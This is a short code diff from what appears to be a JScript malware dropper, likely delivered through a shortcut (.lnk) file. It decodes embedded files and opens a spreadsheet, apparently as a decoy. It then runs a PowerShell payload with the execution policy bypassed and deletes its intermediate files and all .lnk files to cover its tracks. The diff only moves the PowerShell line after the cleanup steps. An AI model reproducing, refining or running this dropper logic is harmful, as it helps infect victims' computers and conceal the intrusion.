@@ -60,10 +60,10 @@ try {
 	Decode(psm_txt_path,psm_path);
 	Decode(xls_txt_path,xls_path);
 	ExecuteFile("cmd.exe /c start "+xls_path);
-	ExecuteFile("powershell -ep bypass "+psm_path);
 	ExecuteFile("cmd.exe /c del "+psm_txt_path);
 	ExecuteFile("cmd.exe /c del "+xls_txt_path);
 	ExecuteFile("cmd.exe /c del "+current_path+"\\*.lnk");
+	ExecuteFile("powershell -ep bypass "+psm_path);
 
 } catch(e) {
 	e.toString();
